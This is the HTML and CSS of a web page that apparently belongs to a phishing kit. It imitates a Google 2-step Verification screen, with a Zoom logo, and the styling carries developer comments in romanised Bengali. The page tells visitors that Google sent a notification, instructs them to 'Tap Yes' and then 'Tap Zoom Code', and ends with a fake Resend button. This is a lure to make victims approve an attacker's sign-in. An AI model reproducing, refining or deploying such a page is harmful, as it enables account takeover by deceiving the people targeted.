<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>2-step Verification</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      color: #202124;
      overflow-x: hidden;
    }

    /* Professional layout container */
    .container {
      width: 100%;
      min-height: 100dvh;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      padding: 2vh 5vw 2.5vh 5vw;
      background: #ffffff;
      max-width: 440px;
      margin: 0 auto;
    }

    /* Top Section */
    .top-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.6vh;
      margin-top: 1vh;
    }

    /* Zoom Logo */
    .logo-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 42px;
    }

    .logo {
      height: 35px;
      width: auto;
      object-fit: contain;
    }

    /* Main Heading */
    h1 {
      font-size: clamp(26px, 6.8vw, 32px);
      font-weight: 500;
      color: #202124;
    }

    /* Subtitle - Aro boro kora holo */
    .subtitle {
      font-size: clamp(16.5px, 4.6vw, 20px);
      color: #5f6368;
      font-weight: 400;
      max-width: 400px;
      line-height: 1.35;
    }

    /* Email Pill Selector box */
    .email-pill {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      padding: 6px 16px;
      border: 1px solid #dadce0;
      border-radius: 20px;
      margin-top: 0.5vh;
      background: #fff;
    }

    .email-pill svg {
      width: 17px;
      height: 17px;
      fill: #1a73e8;
    }

    .email-text {
      font-size: 15px;
      font-weight: 500;
      color: #3c4043;
    }

    .email-pill .arrow {
      font-size: 11px;
      color: #5f6368;
    }

    /* Center Content Wrapper (Phone + Text grouped together) */
    .center-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 1.2vh;
      margin: 1.5vh 0;
    }

    /* Phone Graphic Illustration */
    .phone-illustration {
      width: 65vw;
      max-width: 270px;
      height: auto;
      max-height: 38vh;
      object-fit: contain;
    }

    /* Text Group */
    .text-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.4vh;
    }

    /* Sub Heading - Aro boro kora holo */
    h2 {
      font-size: clamp(24px, 6.2vw, 30px);
      font-weight: 500;
      color: #202124;
    }

    /* Description Text - Aro boro kora holo */
    .desc-text {
      font-size: clamp(18px, 5vw, 22.5px);
      font-weight: 400;
      color: #3c4043;
      line-height: 1.4;
      max-width: 400px;
    }

    .desc-text span {
      font-weight: 600;
      color: #202124;
    }

    /* Resend / Action Button - Text-er niche ebong side crop fix kora holo */
    .btn-join {
      background-color: #1a73e8;
      color: white;
      padding: 15px 0;
      width: 100%;
      max-width: 400px;
      font-size: 19px;
      font-weight: 500;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-top: 1vh;
    }

    .btn-join:hover {
      background-color: #1557b0;
    }

    .btn-join:active {
      background-color: #174ea6;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="top-section">
      <div class="logo-wrapper">
        <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
      </div>
      <h1>2-step Verification</h1>
      <p class="subtitle">This extra step shows that it’s really you trying to sign in</p>
      
     
    </div>

    <!-- Phone illustration and check text grouped together -->
    <div class="center-content">
      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
      <div class="text-group">
        <h2>Check your phone.</h2>
        <p class="desc-text">
          Google sent a notification to your phone.<br>
          <span>Tap Yes</span> on the notification<br>
          Then Tap Zoom Code
        </p>
      </div>
    </div>

    <!-- Resend button text-er niche ebong side crop fix kore dewa holo -->
    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
  </div>

</body>
</html>
